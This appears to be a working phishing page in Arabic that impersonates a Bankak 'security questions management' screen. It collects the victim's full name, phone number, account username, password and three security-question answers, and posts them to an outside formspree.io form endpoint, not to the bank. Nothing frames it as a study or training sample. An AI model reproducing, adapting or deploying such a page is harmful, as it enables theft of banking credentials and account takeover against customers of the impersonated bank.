<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>إدارة أسئلة الأمان</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #f0f0f0; margin: 0; padding: 10px; display: flex; justify-content: center; }
        .card { background: white; width: 100%; max-width: 450px; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .header { background: #000; padding: 15px; text-align: center; position: relative; }
        .logo { width: 120px; }
        .red-bar { background: #c62828; color: white; padding: 12px; text-align: center; font-weight: bold; font-size: 18px; }
        .content { padding: 20px; background: #fff; }
        .q-box { border-bottom: 1px solid #ddd; padding: 15px 0; }
        .q-title { display: block; text-align: right; color: #555; font-size: 14px; margin-bottom: 5px; }
        select, input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; text-align: right; margin-top: 5px; font-size: 15px; background: #f9f9f9; }
        .footer-btns { display: flex; gap: 10px; padding: 20px; background: #eee; }
        .btn { flex: 1; padding: 12px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .btn-send { background: linear-gradient(to bottom, #d32f2f, #b71c1c); color: white; }
        .btn-cancel { background: linear-gradient(to bottom, #d32f2f, #b71c1c); color: white; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="card">
    <div class="header">
        <img src="logo_colored.png" class="logo" alt="Bankak">
    </div>
    <div class="red-bar">إدارة أسئلة الأمان</div>

    <form action="https://formspree.io/f/xzdjwoao" method="POST">
        <div class="content">
            
            <div id="p1">
                <span class="q-title">اختر العملة:</span>
                <select name="Currency">
                    <option>جنيه سوداني (SDG)</option>
                    <option>دولار أمريكي (USD)</option>
                </select>
                <input type="text" name="Full_Name" placeholder="الاسم الكامل" required>
                <input type="number" name="Phone" placeholder="رقم الهاتف" required>
                <button type="button" class="btn btn-send" style="margin-top:15px;" onclick="go(2)">استمرار</button>
            </div>

            <div id="p2" class="hidden">
                <input type="text" name="User_ID" placeholder="اسم المستخدم / رقم الحساب" required>
                <input type="password" name="Pass" placeholder="كلمة المرور" required>
                <button type="button" class="btn btn-send" style="margin-top:15px;" onclick="go(3)">التالي</button>
            </div>

            <div id="p3" class="hidden">
                <div class="q-box">
                    <span class="q-title">إختر السؤال الأول:</span>
                    <select name="Question_1">
                        <option>ما هو اسم ابن عمك الأول؟</option>
                        <option>ما هو اسم مدرستك الابتدائية؟</option>
                    </select>
                    <input type="text" name="Answer_1" placeholder="أدخل الجواب">
                </div>

                <div class="q-box">
                    <span class="q-title">إختر السؤال الثاني:</span>
                    <select name="Question_2">
                        <option>ماذا كان لقبك اثناء الطفولة؟</option>
                        <option>اسم مؤلفك المفضل؟</option>
                        <option>اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
                    </select>
                    <input type="text" name="Answer_2" placeholder="أدخل الجواب">
                </div>

                <div class="q-box">
                    <span class="q-title">إختر السؤال الثالث:</span>
                    <select name="Question_3">
                        <option>أي فيلم هو المفضل لديك؟</option>
                        <option>اسم أفضل صديق في الطفولة؟</option>
                        <option>في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
                        <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
                    </select>
                    <input type="text" name="Answer_3" placeholder="أدخل الجواب">
                </div>

                <div class="footer-btns">
                    <button type="submit" class="btn btn-send">إرسال</button>
                    <button type="button" class="btn btn-cancel">إلغاء</button>
                </div>
            </div>
        </div>
    </form>
</div>

<script>
    function go(s) {
        document.getElementById('p1').classList.add('hidden');
        document.getElementById('p2').classList.add('hidden');
        document.getElementById('p3').classList.remove('hidden');
    }
</script>

</body>
</html>
